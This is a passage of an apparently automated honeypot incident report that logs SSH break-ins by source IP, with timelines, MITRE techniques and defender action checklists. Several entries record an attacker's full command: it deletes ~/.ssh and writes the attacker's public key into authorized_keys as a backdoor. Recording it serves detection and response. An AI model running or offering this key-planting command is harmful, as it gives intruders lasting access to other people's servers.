| `2026-06-09 15:18:19` | `cowrie.session.file_download` |
| `2026-06-09 15:18:19` | `cowrie.log.closed` |
| `2026-06-09 15:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7d1d5a5e06

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-06-09 15:18 |
| **Last Seen** | 2026-06-09 15:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:18:21` | `cowrie.session.connect` |
| `2026-06-09 15:18:21` | `cowrie.client.version` |
| `2026-06-09 15:18:21` | `cowrie.client.kex` |
| `2026-06-09 15:18:21` | `cowrie.login.success` |
| `2026-06-09 15:18:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27c059df6d02

| Field | Detail |
|---|---|
| **Source IP** | `71.229.1[.]186` |
| **First Seen** | 2026-06-09 15:29 |
| **Last Seen** | 2026-06-09 15:29 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:29:06` | `cowrie.session.connect` |
| `2026-06-09 15:29:07` | `cowrie.client.version` |
| `2026-06-09 15:29:07` | `cowrie.client.kex` |
| `2026-06-09 15:29:10` | `cowrie.login.success` |
| `2026-06-09 15:29:11` | `cowrie.direct-tcpip.request` |
| `2026-06-09 15:29:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `71.229.1[.]186` to AbuseIPDB if not already reported
- [ ] Block `71.229.1[.]186` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64762ed92e0e

| Field | Detail |
|---|---|
| **Source IP** | `111.39.167[.]59` |
| **First Seen** | 2026-06-09 15:29 |
| **Last Seen** | 2026-06-09 15:29 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 15:29:17` | `cowrie.session.connect` |
| `2026-06-09 15:29:18` | `cowrie.client.version` |
| `2026-06-09 15:29:18` | `cowrie.client.kex` |
| `2026-06-09 15:29:20` | `cowrie.login.success` |
| `2026-06-09 15:29:21` | `cowrie.direct-tcpip.request` |
| `2026-06-09 15:29:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.39.167[.]59` to AbuseIPDB if not already reported
- [ ] Block `111.39.167[.]59` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3297166bb42c

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:32 |
| **Last Seen** | 2026-06-09 16:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:32:38` | `cowrie.session.connect` |
| `2026-06-09 16:32:38` | `cowrie.client.version` |
| `2026-06-09 16:32:39` | `cowrie.client.kex` |
| `2026-06-09 16:32:40` | `cowrie.login.success` |
| `2026-06-09 16:32:40` | `cowrie.session.params` |
| `2026-06-09 16:32:40` | `cowrie.command.input` |
| `2026-06-09 16:32:40` | `cowrie.command.failed` |
| `2026-06-09 16:32:41` | `cowrie.log.closed` |
| `2026-06-09 16:32:41` | `cowrie.session.params` |
| `2026-06-09 16:32:41` | `cowrie.command.input` |
| `2026-06-09 16:32:41` | `cowrie.session.file_download` |
| `2026-06-09 16:32:41` | `cowrie.log.closed` |
| `2026-06-09 16:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40af67a334f1

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:32 |
| **Last Seen** | 2026-06-09 16:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:32:45` | `cowrie.session.connect` |
| `2026-06-09 16:32:45` | `cowrie.client.version` |
| `2026-06-09 16:32:45` | `cowrie.client.kex` |
| `2026-06-09 16:32:46` | `cowrie.login.success` |
| `2026-06-09 16:32:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80943fdef2cf

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:35 |
| **Last Seen** | 2026-06-09 16:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:35:03` | `cowrie.session.connect` |
| `2026-06-09 16:35:03` | `cowrie.client.version` |
| `2026-06-09 16:35:03` | `cowrie.client.kex` |
| `2026-06-09 16:35:04` | `cowrie.login.success` |
| `2026-06-09 16:35:05` | `cowrie.session.params` |
| `2026-06-09 16:35:05` | `cowrie.command.input` |
| `2026-06-09 16:35:05` | `cowrie.command.failed` |
| `2026-06-09 16:35:05` | `cowrie.log.closed` |
| `2026-06-09 16:35:05` | `cowrie.session.params` |
| `2026-06-09 16:35:05` | `cowrie.command.input` |
| `2026-06-09 16:35:06` | `cowrie.session.file_download` |
| `2026-06-09 16:35:06` | `cowrie.log.closed` |
| `2026-06-09 16:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c921d4dcb469

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:35 |
| **Last Seen** | 2026-06-09 16:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:35:09` | `cowrie.session.connect` |
| `2026-06-09 16:35:09` | `cowrie.client.version` |
| `2026-06-09 16:35:09` | `cowrie.client.kex` |
| `2026-06-09 16:35:10` | `cowrie.login.success` |
| `2026-06-09 16:35:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd5a430ab62

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:37 |
| **Last Seen** | 2026-06-09 16:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:37:26` | `cowrie.session.connect` |
| `2026-06-09 16:37:26` | `cowrie.client.version` |
| `2026-06-09 16:37:26` | `cowrie.client.kex` |
| `2026-06-09 16:37:27` | `cowrie.login.success` |
| `2026-06-09 16:37:28` | `cowrie.session.params` |
| `2026-06-09 16:37:28` | `cowrie.command.input` |
| `2026-06-09 16:37:28` | `cowrie.command.failed` |
| `2026-06-09 16:37:28` | `cowrie.log.closed` |
| `2026-06-09 16:37:28` | `cowrie.session.params` |
| `2026-06-09 16:37:28` | `cowrie.command.input` |
| `2026-06-09 16:37:29` | `cowrie.session.file_download` |
| `2026-06-09 16:37:29` | `cowrie.log.closed` |
| `2026-06-09 16:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5edd65593fa

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:37 |
| **Last Seen** | 2026-06-09 16:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:37:32` | `cowrie.session.connect` |
| `2026-06-09 16:37:32` | `cowrie.client.version` |
| `2026-06-09 16:37:32` | `cowrie.client.kex` |
| `2026-06-09 16:37:33` | `cowrie.login.success` |
| `2026-06-09 16:37:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-391fc9b39985

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:39 |
| **Last Seen** | 2026-06-09 16:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:39:48` | `cowrie.session.connect` |
| `2026-06-09 16:39:48` | `cowrie.client.version` |
| `2026-06-09 16:39:48` | `cowrie.client.kex` |
| `2026-06-09 16:39:49` | `cowrie.login.success` |
| `2026-06-09 16:39:50` | `cowrie.session.params` |
| `2026-06-09 16:39:50` | `cowrie.command.input` |
| `2026-06-09 16:39:50` | `cowrie.command.failed` |
| `2026-06-09 16:39:50` | `cowrie.log.closed` |
| `2026-06-09 16:39:51` | `cowrie.session.params` |
| `2026-06-09 16:39:51` | `cowrie.command.input` |
| `2026-06-09 16:39:51` | `cowrie.session.file_download` |
| `2026-06-09 16:39:51` | `cowrie.log.closed` |
| `2026-06-09 16:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e826ed845ace

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:39 |
| **Last Seen** | 2026-06-09 16:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:39:54` | `cowrie.session.connect` |
| `2026-06-09 16:39:54` | `cowrie.client.version` |
| `2026-06-09 16:39:55` | `cowrie.client.kex` |
| `2026-06-09 16:39:56` | `cowrie.login.success` |
| `2026-06-09 16:39:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e072e81e397e

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:40 |
| **Last Seen** | 2026-06-09 16:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:40:35` | `cowrie.session.connect` |
| `2026-06-09 16:40:35` | `cowrie.client.version` |
| `2026-06-09 16:40:35` | `cowrie.client.kex` |
| `2026-06-09 16:40:36` | `cowrie.login.success` |
| `2026-06-09 16:40:37` | `cowrie.session.params` |
| `2026-06-09 16:40:37` | `cowrie.command.input` |
| `2026-06-09 16:40:37` | `cowrie.command.failed` |
| `2026-06-09 16:40:37` | `cowrie.log.closed` |
| `2026-06-09 16:40:37` | `cowrie.session.params` |
| `2026-06-09 16:40:37` | `cowrie.command.input` |
| `2026-06-09 16:40:38` | `cowrie.session.file_download` |
| `2026-06-09 16:40:38` | `cowrie.log.closed` |
| `2026-06-09 16:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8364f197c378

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:40 |
| **Last Seen** | 2026-06-09 16:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:40:41` | `cowrie.session.connect` |
| `2026-06-09 16:40:41` | `cowrie.client.version` |
| `2026-06-09 16:40:41` | `cowrie.client.kex` |
| `2026-06-09 16:40:42` | `cowrie.login.success` |
| `2026-06-09 16:40:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ad08ff2918c

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:41 |
| **Last Seen** | 2026-06-09 16:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:41:22` | `cowrie.session.connect` |
| `2026-06-09 16:41:22` | `cowrie.client.version` |
| `2026-06-09 16:41:22` | `cowrie.client.kex` |
| `2026-06-09 16:41:23` | `cowrie.login.success` |
| `2026-06-09 16:41:24` | `cowrie.session.params` |
| `2026-06-09 16:41:24` | `cowrie.command.input` |
| `2026-06-09 16:41:24` | `cowrie.command.failed` |
| `2026-06-09 16:41:24` | `cowrie.log.closed` |
| `2026-06-09 16:41:24` | `cowrie.session.params` |
| `2026-06-09 16:41:24` | `cowrie.command.input` |
| `2026-06-09 16:41:25` | `cowrie.session.file_download` |
| `2026-06-09 16:41:25` | `cowrie.log.closed` |
| `2026-06-09 16:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07076d4da98c

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:41 |
| **Last Seen** | 2026-06-09 16:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:41:28` | `cowrie.session.connect` |
| `2026-06-09 16:41:28` | `cowrie.client.version` |
| `2026-06-09 16:41:28` | `cowrie.client.kex` |
| `2026-06-09 16:41:29` | `cowrie.login.success` |
| `2026-06-09 16:41:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be29163da8c5

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:42 |
| **Last Seen** | 2026-06-09 16:42 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:42:12` | `cowrie.session.connect` |
| `2026-06-09 16:42:12` | `cowrie.client.version` |
| `2026-06-09 16:42:12` | `cowrie.client.kex` |
| `2026-06-09 16:42:13` | `cowrie.login.success` |
| `2026-06-09 16:42:14` | `cowrie.session.params` |
| `2026-06-09 16:42:14` | `cowrie.command.input` |
| `2026-06-09 16:42:14` | `cowrie.command.failed` |
| `2026-06-09 16:42:14` | `cowrie.log.closed` |
| `2026-06-09 16:42:14` | `cowrie.session.params` |
| `2026-06-09 16:42:14` | `cowrie.command.input` |
| `2026-06-09 16:42:15` | `cowrie.session.file_download` |
| `2026-06-09 16:42:15` | `cowrie.log.closed` |
| `2026-06-09 16:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a710c1c8b44b

| Field | Detail |
|---|---|
| **Source IP** | `154.70.102[.]114` |
| **First Seen** | 2026-06-09 16:42 |
| **Last Seen** | 2026-06-09 16:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 16:42:18` | `cowrie.session.connect` |
| `2026-06-09 16:42:18` | `cowrie.client.version` |
| `2026-06-09 16:42:18` | `cowrie.client.kex` |
| `2026-06-09 16:42:19` | `cowrie.login.success` |
| `2026-06-09 16:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.70.102[.]114` to AbuseIPDB if not already reported
- [ ] Block `154.70.102[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1af6e0b4557

| Field | Detail |
|---|---|
| **Source IP** | `103.166.182[.]155` |
| **First Seen** | 2026-06-09 16:42 |
| **Last Seen** | 2026-06-09 16:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
